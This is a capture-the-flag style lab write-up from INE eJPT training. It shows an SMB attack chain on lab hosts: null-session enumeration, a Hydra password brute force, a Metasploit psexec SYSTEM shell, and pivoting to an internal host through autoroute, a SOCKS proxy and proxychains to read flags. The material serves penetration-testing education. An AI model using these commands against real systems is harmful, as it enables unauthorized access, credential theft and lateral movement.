# NetBIOS Hacking - SMB Enumeration, Exploitation and Pivoting - INE eJPT

INE lab covering the complete SMB attack chain on a Windows target: null session enumeration, user brute force, PsExec-based SYSTEM shell, then pivoting to an internal host using Metasploit autoroute, a SOCKS proxy, and proxychains.

Targets:
- `demo.ine.local` - directly reachable from Kali
- `demo1.ine.local` - internal only, requires pivoting through the first host

---

## Phase 1 - Initial Enumeration

### Reachability and Port Scanning

```bash
ping -c 5 demo.ine.local
ping -c 5 demo1.ine.local
nmap demo.ine.local
nmap -sV -p 139,445 demo.ine.local
```

Only `demo.ine.local` is directly reachable. Open ports: 139 (NetBIOS), 445 (SMB), RPC, RDP.
Target identified as Windows Server 2008 R2 / 2012.

### SMB Protocol and Security Check

```bash
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
```

SMBv1 present. Guest access detected.

### Null Session Check

```bash
smbclient -L demo.ine.local
```

Anonymous access confirmed - shares visible without credentials.

---

## Phase 2 - User Enumeration and Credential Attack

### User Enumeration via NSE

```bash
nmap -p445 --script smb-enum-users demo.ine.local
```

Users found: `admin`, `administrator`, `root`, `guest`

### SMB Brute Force

```bash
echo -e "admin\nadministrator\nroot" > users.txt
hydra -L users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  demo.ine.local smb
```

Valid credentials recovered for multiple users.

---

## Phase 3 - Exploitation via PsExec

```bash
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

Meterpreter session obtained with `NT AUTHORITY\SYSTEM` privileges.

```bash
getuid
sysinfo
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
```

```
FLAG1: 8de67f44f49264e6c99e8a8f5f17110c
```

---

## Phase 4 - Pivoting to demo1.ine.local

### Confirming Internal Reachability

From inside the Meterpreter session:

```bash
shell
ping 10.0.28.125
```

`demo1` is reachable from the compromised host but not from Kali directly.

### Route via Autoroute

```bash
run autoroute -s 10.0.28.0/20
```

Tells Metasploit to route traffic to the internal subnet through the active session.

### SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
```

Proxychains reads `/etc/proxychains4.conf` and routes tool traffic through port 9050 to the internal network.

### Scanning the Internal Target via Proxychains

```bash
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

`-sT` (TCP connect scan) is required via proxy. Raw SYN scan (`-sS`) does not work through SOCKS. `-Pn` skips ping, which is often blocked.

SMB confirmed active on `demo1`.

---

## Phase 5 - Share Access on Internal Target

### Process Migration

`net view` may return access denied from a service process context. Migrating to `explorer.exe` provides a user-level token with proper network credentials:

```bash
migrate -N explorer.exe
shell
net view 10.0.28.125
```

Shares visible: `Documents`, `K$`

### Mounting and Reading Shares

```bash
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
dir D:
type D:\FLAG2.txt
```

```
FLAG2: c8f58de67f44f49264e6c99e8f17110c
```

---

## Flags

```
FLAG1  -> C:\Users\Administrator\Documents\FLAG1.txt  (8de67f44f49264e6c99e8a8f5f17110c)
FLAG2  -> D:\FLAG2.txt on demo1 via pivot             (c8f58de67f44f49264e6c99e8f17110c)
```

---

## Key Takeaways

- Null session access on SMB leaks enough information (shares, users) to plan the full attack without any prior credentials.
- PsExec with valid SMB credentials grants SYSTEM immediately. Weak passwords on Windows infrastructure are high-impact.
- The Metasploit pivoting stack is: `autoroute` (routing) + `socks_proxy` (listener) + `proxychains` (wrapper for external tools). All three components are required.
- `proxychains nmap` requires `-sT -Pn`: TCP connect scan only, no ping. Raw SYN scan does not work through a SOCKS proxy.
- SYSTEM privileges on the first host do not automatically grant network access to internal targets. Process migration from a service context to `explorer.exe` resolves token-related access denied errors on network shares.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
